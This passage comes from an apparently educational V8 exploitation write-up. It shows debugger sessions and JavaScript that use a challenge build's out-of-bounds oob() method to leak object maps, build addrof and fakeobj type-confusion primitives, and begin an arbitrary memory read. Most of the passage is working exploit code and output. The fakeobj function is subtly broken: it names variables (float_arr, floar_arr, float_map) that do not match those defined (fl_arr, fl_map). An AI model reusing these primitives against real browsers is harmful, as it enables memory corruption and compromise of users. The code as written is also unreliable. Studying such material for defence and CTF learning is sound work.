</span></span><span style="display:flex;"><span>d8<span style="color:#f92672">&gt;</span> <span style="color:#e6db74">&#34;0x&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">ftoi</span>(b.<span style="color:#a6e22e">oob</span>()).<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;0x332786dc2ed9&#34;</span>
</span></span><span style="display:flex;"><span>d8<span style="color:#f92672">&gt;</span> <span style="color:#f92672">%</span><span style="color:#a6e22e">DebugPrint</span>(b)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x176d4ccd1401</span> <span style="color:#f92672">&lt;</span>JSArray[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">1.2</span>, <span style="color:#ae81ff">1.1</span>]
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span>
</span></span><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> x<span style="color:#f92672">/</span><span style="color:#ae81ff">4</span>xg <span style="color:#ae81ff">0x176d4ccd1401</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>                              <span style="color:#75715e">// JSArray
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x176d4ccd1400</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000332786dc2ed9</span>	<span style="color:#ae81ff">0x00003882de940c71</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x176d4ccd1410</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000176d4ccd13e1</span>	<span style="color:#ae81ff">0x0000000200000000</span>
</span></span><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> x<span style="color:#f92672">/</span><span style="color:#ae81ff">8</span>xg <span style="color:#ae81ff">0x0000176d4ccd13e1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>                          <span style="color:#75715e">// Elements
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x176d4ccd13e0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x00003882de9414f9</span>	<span style="color:#ae81ff">0x0000000200000000</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x176d4ccd13f0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x3ff3333333333333</span>	<span style="color:#ae81ff">0x3ff199999999999a</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x176d4ccd1400</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000332786dc2ed9</span>	<span style="color:#ae81ff">0x00003882de940c71</span>      <span style="color:#75715e">// JSArray
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//                      ^--- return of b.oob()
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x176d4ccd1410</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000176d4ccd13e1</span>	<span style="color:#ae81ff">0x0000000200000000</span></span></span></code></pre></div>
Therefore, we should consider using an Array of elements of kind <code>PACKED_DOUBLE_ELEMENTS</code> , as we were able to observe, in this case scenario the OOB read/write would enable us to change the map instance of our <code>JSArray</code> object. In the next section we will cover how we can abuse this for exploitation purposes. However, lets also check what happends on an array of objects:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>d8<span style="color:#f92672">&gt;</span> let obj_tmp <span style="color:#f92672">=</span> {a: <span style="color:#ae81ff">1</span>}
</span></span><span style="display:flex;"><span>d8<span style="color:#f92672">&gt;</span> let obj_arr <span style="color:#f92672">=</span> [obj_tmp, obj_tmp]
</span></span><span style="display:flex;"><span>d8<span style="color:#f92672">&gt;</span> <span style="color:#f92672">%</span><span style="color:#a6e22e">DebugPrint</span>(obj_arr)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x176d4ccd4811</span> <span style="color:#f92672">&lt;</span>JSArray[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>d8<span style="color:#f92672">&gt;</span> <span style="color:#f92672">%</span><span style="color:#a6e22e">DebugPrint</span>(obj_tmp)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x176d4ccd2fc1</span> <span style="color:#f92672">&lt;</span>Object map <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x332786dcab39</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>d8<span style="color:#f92672">&gt;</span> <span style="color:#e6db74">&#34;0x&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">ftoi</span>(obj_arr.<span style="color:#a6e22e">oob</span>()).<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;0x332786dc2f79&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span>
</span></span><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> x<span style="color:#f92672">/</span><span style="color:#ae81ff">4</span>xg <span style="color:#ae81ff">0x176d4ccd4811</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x176d4ccd4810</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000332786dc2f79</span>	<span style="color:#ae81ff">0x00003882de940c71</span>   <span style="color:#75715e">// JSArray
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x176d4ccd4820</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000176d4ccd47f1</span>	<span style="color:#ae81ff">0x0000000200000000</span>
</span></span><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> x<span style="color:#f92672">/</span><span style="color:#ae81ff">8</span>xg <span style="color:#ae81ff">0x0000176d4ccd47f1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x176d4ccd47f0</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x00003882de940801</span>	<span style="color:#ae81ff">0x0000000200000000</span>   <span style="color:#75715e">// Elements
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x176d4ccd4800</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000176d4ccd2fc1</span>	<span style="color:#ae81ff">0x0000176d4ccd2fc1</span>		
</span></span><span style="display:flex;"><span><span style="color:#75715e">//                     ^--- slot: 0			^--- slot: 1
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x176d4ccd4810</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000332786dc2f79</span>	<span style="color:#ae81ff">0x00003882de940c71</span>   <span style="color:#75715e">// JSArray
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//                     ^--- return of obj_arr.oob()
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x176d4ccd4820</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x0000176d4ccd47f1</span>	<span style="color:#ae81ff">0x0000000200000000</span></span></span></code></pre></div>
We can observe that on an JSArray of objects, elements layout is stored very similarly as in a <code>PACKED_DOUBLE_ELEMENTS</code> JSArray containing doubles, despite the fact that the element kind of a JSArray of objects is of <code>PACKED_ELEMENTS</code>.</p>
<h1 id="03---the-addrof-and-fakeobj-primitives">03 - The AddrOf and FakeObj Primitives<a href="#03---the-addrof-and-fakeobj-primitives" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>We covered that thanks to the OOB read vulnerability, we can leak the map of a <code>JSArray</code> of objects and a <code>JSArray</code> of doubles. But lets remember that we also have a OOB write primitive. Could we overwrite the map of one object with another? Lets find out:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>d8<span style="color:#f92672">&gt;</span> arr_float <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1.1</span>, <span style="color:#ae81ff">2.2</span>]
</span></span><span style="display:flex;"><span>d8<span style="color:#f92672">&gt;</span> arr_float_map <span style="color:#f92672">=</span> arr_float.<span style="color:#a6e22e">oob</span>()
</span></span><span style="display:flex;"><span>d8<span style="color:#f92672">&gt;</span> obj <span style="color:#f92672">=</span> {}
</span></span><span style="display:flex;"><span>d8<span style="color:#f92672">&gt;</span> obj_arr[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> obj
</span></span><span style="display:flex;"><span>d8<span style="color:#f92672">&gt;</span> obj_arr.<span style="color:#a6e22e">oob</span>(arr_float_map)          <span style="color:#75715e">// overwritting JSArray of objects&#39; 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                                        <span style="color:#75715e">// map with the map of an JSArray
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                                        <span style="color:#75715e">// of doubles
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>d8<span style="color:#f92672">&gt;</span> obj_arr[<span style="color:#ae81ff">0</span>]                          <span style="color:#75715e">// This should have returned
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">9.907674278247e-311</span>                     <span style="color:#75715e">// an object but instead
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                                        <span style="color:#75715e">// it returns a float
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>d8<span style="color:#f92672">&gt;</span> <span style="color:#e6db74">&#34;0x&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">ftoi</span>(obj_arr[<span style="color:#ae81ff">0</span>]).<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;0x123d09290a11&#34;</span>
</span></span><span style="display:flex;"><span>d8<span style="color:#f92672">&gt;</span> <span style="color:#f92672">%</span><span style="color:#a6e22e">DebugPrint</span>(obj)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x123d09290a11</span> <span style="color:#f92672">&lt;</span>Object map <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xc8433dc0459</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>d8<span style="color:#f92672">&gt;</span> 
</span></span></code></pre></div>
<p>We can observe that if we overwrite the map of a <strong>JSArray of Objects</strong> with the map of an <strong>JSArray of doubles</strong>, the affected JSArray of objects will behave differently when elements are tried to be yield from it, returning the <code>double</code> interpretation of the object handle rather than the object handle itslef. As we can see in the example above, we were able to leak the addess of <code>obj</code> using this methodology. This is what&rsquo;s commonly known as the <code>addrof</code> primitive, abusing a type-confusion bug to leverage a memory disclousure vulnerbability.</p>
<p>Other common type-confusion primitive, is whats commonly known as <code>fakeobj</code>. Although is quite similar, it serves for a different purpose. Fakeobj in this example consists of replacing the map instance of an <strong>JSArray of doubles</strong> to the one of an <strong>JSArray of objects</strong>. This way, we can force V8 to interpret an object instance in a location where in reality it doesn&rsquo;t exist. The implications of fabricating an object on an arbitrary memory location entails that one would ultimately be able to read/write that arbitrary location by manipulating the elements of the given object. Lets illustrate this with an example:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>d8<span style="color:#f92672">&gt;</span> flt_arr <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1.1</span>, <span style="color:#ae81ff">1.2</span>]
</span></span><span style="display:flex;"><span>d8<span style="color:#f92672">&gt;</span> temp_obj <span style="color:#f92672">=</span> {}
</span></span><span style="display:flex;"><span>d8<span style="color:#f92672">&gt;</span> objt_arr <span style="color:#f92672">=</span> [temp_obj]
</span></span><span style="display:flex;"><span>d8<span style="color:#f92672">&gt;</span> objt_arr_map <span style="color:#f92672">=</span> objt_arr.<span style="color:#a6e22e">oob</span>()
</span></span><span style="display:flex;"><span>d8<span style="color:#f92672">&gt;</span> fake_object_template <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1.1</span>, <span style="color:#ae81ff">1.2</span>, <span style="color:#ae81ff">1.3</span>]
</span></span><span style="display:flex;"><span>d8<span style="color:#f92672">&gt;</span> <span style="color:#f92672">%</span><span style="color:#a6e22e">DebugPrint</span>(fake_object_template)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x2824cc3d2509</span> <span style="color:#f92672">&lt;</span>JSArray[<span style="color:#ae81ff">4</span>]<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>d8<span style="color:#f92672">&gt;</span> flt_arr[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>(<span style="color:#ae81ff">0x2824cc3d2509</span>n)
</span></span><span style="display:flex;"><span>d8<span style="color:#f92672">&gt;</span> flt_arr.<span style="color:#a6e22e">oob</span>(objt_arr_map)           <span style="color:#75715e">// Overwritting flt_arr map
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>d8<span style="color:#f92672">&gt;</span> let fake_obj <span style="color:#f92672">=</span> flt_arr[<span style="color:#ae81ff">0</span>]           <span style="color:#75715e">// this should be a float.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>d8<span style="color:#f92672">&gt;</span> fake_obj                            <span style="color:#75715e">// instead is a copy of flt_arr
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>[<span style="color:#ae81ff">1.1</span>, <span style="color:#ae81ff">1.2</span>, <span style="color:#ae81ff">1.3</span>]
</span></span><span style="display:flex;"><span>d8<span style="color:#f92672">&gt;</span> <span style="color:#f92672">%</span><span style="color:#a6e22e">DebugPrint</span>(fake_obj)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x2824cc3d2509</span> <span style="color:#f92672">&lt;</span>JSArray[<span style="color:#ae81ff">4</span>]<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">1.1</span>, <span style="color:#ae81ff">1.2</span>, <span style="color:#ae81ff">1.3</span>]
</span></span><span style="display:flex;"><span>d8<span style="color:#f92672">&gt;</span> fake_obj[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1.1</span></span></span></code></pre></div>
From now on we will refer to these primitives as <code>addrof</code> and <code>fakeobj</code> and we will be supplying them to the <code>d8</code> shell with the following script:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">tmp_obj</span> <span style="color:#f92672">=</span> {}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">obj_arr</span> <span style="color:#f92672">=</span> [<span style="color:#a6e22e">tmp_obj</span>]
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">fl_arr</span> <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1.1</span>, <span style="color:#ae81ff">2.2</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// oob read. leaking the Array of objects map
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">obj_map</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">obj_arr</span>.<span style="color:#a6e22e">oob</span>()
</span></span><span style="display:flex;"><span><span style="color:#75715e">// oob read. leaking the Array of doubles map
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">fl_map</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fl_arr</span>.<span style="color:#a6e22e">oob</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">in_obj</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// setting the object we want the address of as an element of obj_arr
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">obj_arr</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">in_obj</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// oob write. changing the map of obj_arr for the fl_arr map.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">obj_arr</span>.<span style="color:#a6e22e">oob</span>(<span style="color:#a6e22e">fl_map</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// even though we are accesing obj_arr, the returned element will be a float
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">obj_arr</span>[<span style="color:#ae81ff">0</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// oob write. restoring the map of the object for the original one
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">obj_arr</span>.<span style="color:#a6e22e">oob</span>(<span style="color:#a6e22e">obj_map</span>);
</span></span><span style="display:flex;"><span>		
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// returning the integer representation of the leaked pointer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">addr</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">fakeobj</span>(<span style="color:#a6e22e">addr</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// storing the float value of an arbitrary address as an element of float_arr
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">float_arr</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">addr</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// oob write. replacing the map of the float_arr to that of the obj_arr
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">floar_arr</span>.<span style="color:#a6e22e">oob</span>(<span style="color:#a6e22e">obj_map</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// even though we are accessing fl_arr, the returned element will be a tagged pointer.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">fake</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">float_arr</span>[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// oob write. restoring original map of fl_arr
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">float_arr</span>.<span style="color:#a6e22e">oob</span>(<span style="color:#a6e22e">float_map</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// returning tagged pointer of arbitrary address
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">fake</span>;
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
<h1 id="04---introducing-an-arbitrary-read-primitive">04 - Introducing an Arbitrary Read Primitive<a href="#04---introducing-an-arbitrary-read-primitive" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>Since we have the capability of knowing the address of objects, and to create an object in any arbitrary address that we wish thanks to the previous <code>addrof</code> and <code>fakeobj</code> primitives accordingly, the realization of an arbitrary read primitive is fearly straight forward:</p>
<ol>
<li>The first step is to create a fake FixedDoubleArray object via <code>fakeobj</code>. We can do this by creating a &ldquo;crafted&rdquo; array, in which its first element is a DoubleArray map. We should create our fake object on top of our crafted array <code>elements</code> object, taking into account that elements in a FixedDoubleArray will be stored <code>-0x20 bytes</code> from the actual address of the given JSArray object address.</li>
<li>Once we have created our fake object on top of our crafted array&rsquo;s elements, then we can manipulate the elements of that array, as if they were the actual properties or element pointers of our fake JSArray object.</li>
<li>We can modify <code>crafted_arr[2]</code> as to replace what would be the elements pointer of our fake object. Since we will be dereferencing the value of what would be the first element of our fake object, the dereferenced value will be the contents of <code>object's elements pointer + element offset</code>. It&rsquo;s important to mention that we have to substract to <code>crafted_arr[2]</code> the offset from the initial address of the JSArray object to its first element, in this case <code>0x10</code>. This is becuase the usual structure of the FixedDoubleArray object holding the elements of a given JSObject, would be the following:
<ul>
<li>offset 0: FixedDoubleArray map</li>
<li>offset 8: Number of elements is Smi notation</li>
<li>offset 16: First element</li>
<li>offset 24: Second element</li>
<li>&hellip; and so on
Therefore, when v8 tries to access the first element of an JSarray object, it will retrieve the elements pointer from the JSArray object, and will add to it the offset of the first element (in this case 0x10).</li>
</ul>
</li>
<li>As mentioned previously, when we retrieve the contents of <code>fake[0]</code>, it will dereference its element pointer, and since the object is of type FixedDoubleArray (as estipulated by its object map at <code>crafted_arr[0]</code>) it will return a float representation of the derefenced value.</li>
</ol>
<p>We can see this ilustrated in the following d8/gdb session:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">d8</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">test_arr</span> <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0x1337</span>]
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">4919</span>]
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">d8</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">crafted_arr</span> <span style="color:#f92672">=</span> [<span style="color:#a6e22e">fl_arr_map</span>, <span style="color:#ae81ff">1.1</span>, <span style="color:#ae81ff">1.2</span>, <span style="color:#ae81ff">1.3</span>];
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">1.82361084311683</span><span style="color:#a6e22e">e</span><span style="color:#f92672">-</span><span style="color:#ae81ff">310</span>, <span style="color:#ae81ff">1.1</span>, <span style="color:#ae81ff">1.2</span>, <span style="color:#ae81ff">1.3</span>]
</span></span><span style="display:flex;"><span><span style="color:#75715e">// creating our fake object on top of our crafted array
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">d8</span><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">_fake</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fakeobj</span>(<span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">crafted_arr</span>)<span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span><span style="color:#a6e22e">n</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">undefined</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// overwriting what would be _fake&#39;s elements pointer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">d8</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">crafted_arr</span>[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">test_arr</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span><span style="color:#a6e22e">n</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span><span style="color:#a6e22e">n</span>);  
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1.34989222600073</span><span style="color:#a6e22e">e</span><span style="color:#f92672">-</span><span style="color:#ae81ff">310</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">d8</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">elements_ptr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_fake</span>[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1.349892225996</span><span style="color:#a6e22e">e</span><span style="color:#f92672">-</span><span style="color:#ae81ff">310</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">d8</span><span style="color:#f92672">&gt;</span> <span style="color:#e6db74">&#34;0x&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">elements_ptr</span>).<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">16</span>);
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;0x18d96d6d5e41&#34;</span> <span style="color:#75715e">// this is test_arr elements pointer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">d8</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">%</span><span style="color:#a6e22e">DebugPrint</span>(<span style="color:#a6e22e">test_arr</span>)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x18d96d6d5e71</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">JSArray</span>[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">d8</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">%</span><span style="color:#a6e22e">DebugPrint</span>(<span style="color:#a6e22e">crafted_arr</span>)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x18d9bd6d5e71</span> <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">JSArray</span>[<span style="color:#ae81ff">4</span>]<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// test_arr
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">pwndbg</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">x</span><span style="color:#f92672">/</span><span style="color:#ae81ff">4</span><span style="color:#a6e22e">xg</span> <span style="color:#ae81ff">0x18d96d6d5e71</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x18d96d6d5e70</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x00002191d8fc2ed9</span>	<span style="color:#ae81ff">0x00003261124c0c71</span>         <span style="color:#75715e">//JSArray
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x18d96d6d5e80</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x000018d96d6d5e41</span>	<span style="color:#ae81ff">0x0000000400000000</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">//                      ^--elements_ptr
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// crafted_arr before modification
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">pwndbg</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">x</span><span style="color:#f92672">/</span><span style="color:#ae81ff">8</span><span style="color:#a6e22e">xg</span> <span style="color:#ae81ff">0x18d9bd6d5e70</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span>   <span style="color:#75715e">// FixedDoubleArray holding 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                                    <span style="color:#75715e">// JSArray&#39;s elements (at JSArray-0x20) 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                                    <span style="color:#75715e">// _fake fakeobj is created here	
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0x18d9bd6d5e50</span><span style="color:#f92672">:</span>	<span style="color:#ae81ff">0x00002a91d8fc2ed9</span>	<span style="color:#ae81ff">0x3ff199999999999a</span>
